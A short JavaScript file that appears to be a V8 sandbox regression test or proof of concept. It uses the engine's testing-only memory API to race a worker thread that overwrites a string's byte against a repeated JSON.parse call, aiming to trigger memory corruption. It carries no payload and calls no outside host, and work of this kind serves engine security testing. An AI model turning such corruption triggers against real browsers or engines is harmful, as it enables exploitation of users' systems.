let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const v9 = String.fromCodePoint(6);
const v14 = JSON.stringify(v9);

function corruptInBackground(address) {
    function workerTemplate(address) {
        let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        while (true) {
            memory.setUint8(address, 0x30, true);
            memory.setUint8(address, 0xcf, true);
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}

let v14_addr = Sandbox.getAddressOf(v14);
print("v14_addr: 0x" + v14_addr.toString(16));

// Address of the singeel byte in the one byte string
const c = sbx_memory.getUint8(v14_addr + 16);
print("c: 0x" + c.toString(16));

corruptInBackground(v14_addr + 16)

while (1) {
    try {
        JSON.parse(v14);
    } catch (e) {
        print(e)
    }
}
